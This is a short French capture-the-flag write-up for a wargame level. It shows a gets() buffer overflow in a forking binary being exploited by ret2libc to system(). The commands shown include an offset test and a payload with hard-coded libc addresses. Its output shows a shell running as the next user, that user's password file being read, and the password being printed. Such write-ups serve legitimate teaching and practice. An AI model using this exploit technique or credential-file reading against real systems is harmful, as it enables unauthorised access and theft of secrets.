# Level 04

Quand on lance le programme, il nous demande de lui donner du shellcode.

En décompilant le binaire on observe que le binaire se fork et une partie, utilise `gets` cette fonction nous permet de faire un buffer overflow.

Si nous continuons d'examiner le code on peut voir qu'il y a une protection du processus parent qui nous empêche d'utiliser la fonction `exec()`, mais nous pouvons utiliser la fonction `system()` avec un ret2libc.

Il nous font donc maintenant determiner le à quel moment on va réecrire l'EIP, le buffer de gets est de 128 en testant on s'aperçois que l'offest est de 156.

Nous pouvons donc exploiter le binaire.

```shell
~ python -c 'print "B"*128' | ./level04
Give me some shellcode, k
child is exiting...
~ echo "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmm" | ./level04
Give me some shellcode, k
Give me some shellcode, k
...
~ echo -n "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmm" | wc -c
156
~ python -c 'print "B"*156 + "\xd0\xae\xe6\xf7" + "OSEF" + "\xec\x97\xf8\xf7"' > /tmp/level04
~ cat /tmp/level04 - | ./level04
Give me some shellcode, k
whoami
level05
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```

